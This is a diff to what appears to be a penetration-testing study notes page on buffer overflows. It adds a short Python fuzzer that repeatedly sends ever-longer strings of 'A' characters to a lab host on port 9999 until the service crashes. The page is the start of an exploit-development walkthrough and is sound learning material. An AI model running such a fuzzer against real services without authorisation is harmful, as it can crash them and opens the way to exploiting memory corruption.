@@ -1,8 +1,33 @@
-# BoF
+# Buffer Overflow
 
 ## Fuzzer
 
 {% embed url="https://github.com/AceSineX/BOF-fuzzer-python-3-All-in" %}
+
+```python
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+prefix = ""
+while True:
+ try:
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(('192.168.183.130',9999))
+
+	payload = prefix + buffer
+
+	s.send((payload.encode()))
+	s.close()
+	sleep(1)
+	buffer = buffer + "A"*100
+
+ except:
+	print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
+	sys.exit()
+```
 
 ## Steps
 
